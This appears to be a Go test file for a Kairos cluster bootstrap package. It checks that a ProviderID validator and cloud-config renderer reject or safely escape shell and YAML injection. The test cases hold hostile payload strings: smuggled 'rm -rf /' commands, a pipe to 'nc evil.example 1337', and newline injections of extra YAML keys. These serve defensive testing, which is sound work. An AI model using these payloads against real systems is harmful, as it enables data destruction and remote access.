/*
Copyright 2024 The Kairos CAPI Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
implied. See the License for the specific language governing
permissions and limitations under the License.
*/

package bootstrap

import (
	"strings"
	"testing"

	yaml "gopkg.in/yaml.v3"
)

// TestValidateProviderID_PositiveCases asserts that every real-world
// ProviderID we accept from upstream infrastructure providers is allowed
// by the validator. If any of these starts failing, the regex needs to be
// relaxed — but only with a documented reason.
func TestValidateProviderID_PositiveCases(t *testing.T) {
	cases := []struct {
		name string
		id   string
	}{
		{"empty (workers, pre-providerID)", ""},
		{"vsphere uuid", "vsphere://422fa74a-5d60-3a4a-af24-1f07be515fcc"},
		{"kubevirt namespaced", "kubevirt://default/vm-name-0"},
		{"kubevirt complex name", "kubevirt://ns-1/pool.vm-controlplane-0"},
		{"docker", "docker:///kind-cluster-control-plane"},
		{"aws", "aws:///us-east-1a/i-0123456789abcdef0"},
		{"gce", "gce://my-project/us-central1-a/instance-name"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := ValidateProviderID(tc.id); err != nil {
				t.Fatalf("ValidateProviderID(%q): unexpected error: %v", tc.id, err)
			}
		})
	}
}

// TestValidateProviderID_RejectsInjection is the heart of KD-2: the validator
// MUST reject every shell-injection payload that would otherwise execute as
// root at first boot. ProviderID is interpolated into a shell `printf`/`echo`
// inside a systemd ExecStartPre directive in the rendered cloud-config; any
// character that escapes the shell context here is RCE.
func TestValidateProviderID_RejectsInjection(t *testing.T) {
	cases := []struct {
		name string
		id   string
	}{
		{"shell escape via double quote", `vsphere://abc"; rm -rf /; echo "`},
		{"json escape", `vsphere://abc"},"evil":"yes`},
		{"command substitution", "vsphere://abc$(rm -rf /)"},
		{"backtick command substitution", "vsphere://abc`rm -rf /`"},
		{"newline", "vsphere://abc\nrm -rf /"},
		{"semicolon", "vsphere://abc; rm -rf /"},
		{"pipe", "vsphere://abc | nc evil.example 1337"},
		{"single quote", "vsphere://abc'OR'1'='1"},
		{"yaml block break", "vsphere://abc\n---\n: bad"},
		{"missing scheme", "no-scheme-here"},
		{"scheme starts with digit", "1bad://value"},
		{"empty path", "vsphere://"},
		{"trailing whitespace", "vsphere://abc "},
		{"leading whitespace", " vsphere://abc"},
		{"NUL byte", "vsphere://abc\x00bad"},
		{"BEL byte", "vsphere://abc\x07bad"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := ValidateProviderID(tc.id); err == nil {
				t.Fatalf("ValidateProviderID(%q): expected rejection, got nil", tc.id)
			}
		})
	}
}

// TestRenderRejectsBadProviderID asserts the renderer itself refuses to emit
// userdata with an invalid ProviderID. This is the defense-in-depth guarantee
// the cloudconfig-rendering-safety skill calls for: validation in the
// webhook/controller, AND at render time.
func TestRenderRejectsBadProviderID(t *testing.T) {
	data := TemplateData{
		Role:       "control-plane",
		SingleNode: true,
		UserName:   "kairos",
		ProviderID: `vsphere://abc"; rm -rf /; echo "`,
	}
	if _, err := RenderK0sCloudConfig(data); err == nil {
		t.Errorf("RenderK0sCloudConfig with injection payload: expected error, got nil")
	}
	if _, err := RenderK3sCloudConfig(data); err == nil {
		t.Errorf("RenderK3sCloudConfig with injection payload: expected error, got nil")
	}
}

// adversarialPayloads covers YAML-injection payloads every escaped scalar
// field must survive. The test renders, parses the rendered YAML back, and
// asserts the field round-trips to the original input — proving no metachar
// escaped its scalar.
//
// Payloads that contain `\n`, `\r`, or NUL are deliberately NOT in this map:
// validateTemplateData rejects them outright (see controlCharPayloads below).
// They would otherwise force yaml.v3 into a block-scalar form that doesn't
// re-embed safely into the surrounding template.
var adversarialPayloads = map[string]string{
	"trailing colon":        "foo:",
	"colon space":           "foo: bar",
	"colon space hash":      "foo: # comment",
	"yaml flow mapping":     "{evil: true}",
	"shell metas":           `"; rm -rf /; echo "`,
	"bool-y value (true)":   "true",
	"bool-y value (yes)":    "yes",
	"int-y value":           "12345",
	"null-y value":          "null",
	"backslash and quote":   `\"\\`,
	"unicode":               "héllo-wörld",
	"leading dash":          "-dash-prefix",
	"leading hash":          "#commenty",
	"tab character":         "foo\tbar",
	"single quote":          "it's a test",
	"yaml anchor character": "&anchor",
	"yaml alias character":  "*alias",
}

// controlCharPayloads MUST be rejected by validateTemplateData. These are the
// characters that break either (a) the surrounding YAML's block-scalar /
// list-item indentation contract or (b) shell quoting in the file-content
// block scalars where some fields are also embedded.
var controlCharPayloads = map[string]string{
	"newline injection":  "foo\nshell: /bin/sh",
	"crlf newline":       "foo\r\nbar",
	"yaml doc separator": "---\nevil: true",
	"NUL byte":           "foo\x00bar",
	"bare carriage return": "foo\rbar",
}

// TestRender_AdversarialHostname checks that a malicious Hostname produces
// well-formed YAML that round-trips to the original value, for both
// distributions on both infra paths.
func TestRender_AdversarialHostname(t *testing.T) {
	for name, payload := range adversarialPayloads {
		for _, isKV := range []bool{false, true} {
			for _, dist := range []string{"k0s", "k3s"} {
				caseName := name + "/" + dist
				if isKV {
					caseName += "/capk"
				} else {
					caseName += "/capv"
				}
				t.Run(caseName, func(t *testing.T) {
					data := TemplateData{
						Role:       "control-plane",
						SingleNode: true,
						Hostname:   payload,
						UserName:   "kairos",
						IsKubeVirt: isKV,
					}
					out, err := renderForDist(dist, data)
					if err != nil {
						t.Fatalf("render: %v", err)
					}
					assertHostnameRoundTrips(t, out, payload)
				})
			}
		}
	}
}

// TestRender_AdversarialUserPassword checks that a malicious UserPassword
// (the most likely user-controlled secret) does not break the YAML or leak
// across into a sibling key. We assert YAML validity and that the password
// round-trips on the first user entry.
func TestRender_AdversarialUserPassword(t *testing.T) {
	for name, payload := range adversarialPayloads {
		t.Run(name, func(t *testing.T) {
			data := TemplateData{
				Role:         "control-plane",
				SingleNode:   true,
				Hostname:     "host",
				UserName:     "kairos",
				UserPassword: payload,
			}
			out, err := RenderK0sCloudConfig(data)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			assertUserPasswordRoundTrips(t, out, payload)
		})
	}
}

// TestRender_AdversarialUserGroups checks the slice-quoting path: a malicious
// group name must not collapse a list item into a mapping.
func TestRender_AdversarialUserGroups(t *testing.T) {
	for name, payload := range adversarialPayloads {
		t.Run(name, func(t *testing.T) {
			data := TemplateData{
				Role:         "control-plane",
				SingleNode:   true,
				Hostname:     "host",
				UserName:     "kairos",
				UserPassword: "ok",
				UserGroups:   []string{"admin", payload},
			}
			out, err := RenderK0sCloudConfig(data)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			groups := firstUserGroups(t, out)
			if len(groups) != 2 {
				t.Fatalf("expected 2 groups, got %d: %#v", len(groups), groups)
			}
			if groups[0] != "admin" || groups[1] != payload {
				t.Errorf("groups did not round-trip: got %#v, want [admin, %q]", groups, payload)
			}
		})
	}
}

// TestRender_AdversarialDNSServers checks the DNS list-quoting path.
func TestRender_AdversarialDNSServers(t *testing.T) {
	for name, payload := range adversarialPayloads {
		t.Run(name, func(t *testing.T) {
			data := TemplateData{
				Role:         "control-plane",
				SingleNode:   true,
				Hostname:     "host",
				UserName:     "kairos",
				UserPassword: "ok",
				DNSServers:   []string{"1.1.1.1", payload},
			}
			out, err := RenderK0sCloudConfig(data)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			// Output must parse as YAML — that's enough for the list case.
			var doc map[string]any
			if err := yaml.Unmarshal([]byte(stripCloudConfigHeader(out)), &doc); err != nil {
				t.Fatalf("rendered YAML did not parse: %v\n---\n%s", err, out)
			}
		})
	}
}

// TestRender_RejectsControlChars asserts that the render-time validator
// refuses to emit userdata when any string field contains a forbidden
// control character (newline, CR, NUL). These would otherwise either inject
// extra YAML keys or break the block-scalar embed of fields that also appear
// inside file-content / shell contexts.
//
// We exercise the rejection on several field types to confirm the generic
// rejectControlChars rule fires uniformly.
func TestRender_RejectsControlChars(t *testing.T) {
	for name, payload := range controlCharPayloads {
		t.Run("Hostname/"+name, func(t *testing.T) {
			data := TemplateData{Role: "control-plane", SingleNode: true, Hostname: payload, UserName: "kairos"}
			if _, err := RenderK0sCloudConfig(data); err == nil {
				t.Errorf("Hostname=%q: expected render error, got nil", payload)
			}
		})
		t.Run("UserPassword/"+name, func(t *testing.T) {
			data := TemplateData{Role: "control-plane", SingleNode: true, Hostname: "h", UserName: "kairos", UserPassword: payload}
			if _, err := RenderK0sCloudConfig(data); err == nil {
				t.Errorf("UserPassword=%q: expected render error, got nil", payload)
			}
		})
		t.Run("WorkerToken/"+name, func(t *testing.T) {
			data := TemplateData{Role: "worker", Hostname: "h", UserName: "kairos", WorkerToken: payload}
			if _, err := RenderK0sCloudConfig(data); err == nil {
				t.Errorf("WorkerToken=%q: expected render error, got nil", payload)
			}
		})
		t.Run("UserGroups/"+name, func(t *testing.T) {
			data := TemplateData{Role: "control-plane", SingleNode: true, Hostname: "h", UserName: "kairos", UserGroups: []string{"admin", payload}}
			if _, err := RenderK0sCloudConfig(data); err == nil {
				t.Errorf("UserGroups[1]=%q: expected render error, got nil", payload)
			}
		})
		t.Run("DNSServers/"+name, func(t *testing.T) {
			data := TemplateData{Role: "control-plane", SingleNode: true, Hostname: "h", UserName: "kairos", DNSServers: []string{"1.1.1.1", payload}}
			if _, err := RenderK0sCloudConfig(data); err == nil {
				t.Errorf("DNSServers[1]=%q: expected render error, got nil", payload)
			}
		})
	}
}

// TestSafeIndent_CRLF asserts the indent function strips \r so Windows-authored
// Manifest.Content doesn't leak \r into the YAML block scalar (which would
// then propagate into files written on the node).
func TestSafeIndent_CRLF(t *testing.T) {
	in := "line1\r\nline2\r\nline3"
	out := safeIndent(2, in)
	if strings.Contains(out, "\r") {
		t.Errorf("safeIndent leaked \\r: %q", out)
	}
	want := "  line1\n  line2\n  line3"
	if out != want {
		t.Errorf("safeIndent CRLF result: got %q, want %q", out, want)
	}
}

// --- helpers ---

func renderForDist(dist string, data TemplateData) (string, error) {
	if dist == "k0s" {
		return RenderK0sCloudConfig(data)
	}
	return RenderK3sCloudConfig(data)
}

// stripCloudConfigHeader removes the leading `#cloud-config` marker so the
// remaining text can be parsed as a single YAML document.
func stripCloudConfigHeader(s string) string {
	for _, prefix := range []string{"#cloud-config\n", "#cloud-config\r\n"} {
		if strings.HasPrefix(s, prefix) {
			return strings.TrimPrefix(s, prefix)
		}
	}
	return s
}

func parseRendered(t *testing.T, out string) map[string]any {
	t.Helper()
	var doc map[string]any
	if err := yaml.Unmarshal([]byte(stripCloudConfigHeader(out)), &doc); err != nil {
		t.Fatalf("rendered YAML did not parse: %v\n---\n%s", err, out)
	}
	return doc
}

func assertHostnameRoundTrips(t *testing.T, out, want string) {
	t.Helper()
	doc := parseRendered(t, out)
	got, ok := doc["hostname"].(string)
	if !ok {
		// hostname is omitted only when both Hostname and HostnamePrefix are empty.
		// Our tests always set Hostname, so a missing or non-string value is a bug.
		t.Fatalf("hostname missing or not a string: %T %#v", doc["hostname"], doc["hostname"])
	}
	if got != want {
		t.Errorf("hostname did not round-trip:\n got: %q\nwant: %q", got, want)
	}
}

// assertUserPasswordRoundTrips finds the first non-`capk` user in `users:`
// and asserts its passwd field matches `want`.
func assertUserPasswordRoundTrips(t *testing.T, out, want string) {
	t.Helper()
	users := allUsers(t, out)
	for _, u := range users {
		if name, _ := u["name"].(string); name == "capk" {
			continue
		}
		got, ok := u["passwd"].(string)
		if !ok {
			t.Fatalf("first non-capk user has no string passwd: %#v", u)
		}
		if got != want {
			t.Errorf("user passwd did not round-trip:\n got: %q\nwant: %q", got, want)
		}
		return
	}
	t.Fatalf("no non-capk user found in users[] (parsed: %#v)", users)
}

// firstUserGroups returns the groups slice from the first non-capk user entry.
func firstUserGroups(t *testing.T, out string) []string {
	t.Helper()
	users := allUsers(t, out)
	for _, u := range users {
		if name, _ := u["name"].(string); name == "capk" {
			continue
		}
		raw, _ := u["groups"].([]any)
		groups := make([]string, 0, len(raw))
		for _, g := range raw {
			s, _ := g.(string)
			groups = append(groups, s)
		}
		return groups
	}
	t.Fatalf("no non-capk user found in users[] (parsed: %#v)", users)
	return nil
}

func allUsers(t *testing.T, out string) []map[string]any {
	t.Helper()
	doc := parseRendered(t, out)
	rawUsers, ok := doc["users"].([]any)
	if !ok {
		t.Fatalf("users[] missing or not a list: %T %#v", doc["users"], doc["users"])
	}
	users := make([]map[string]any, 0, len(rawUsers))
	for _, u := range rawUsers {
		m, _ := u.(map[string]any)
		users = append(users, m)
	}
	return users
}
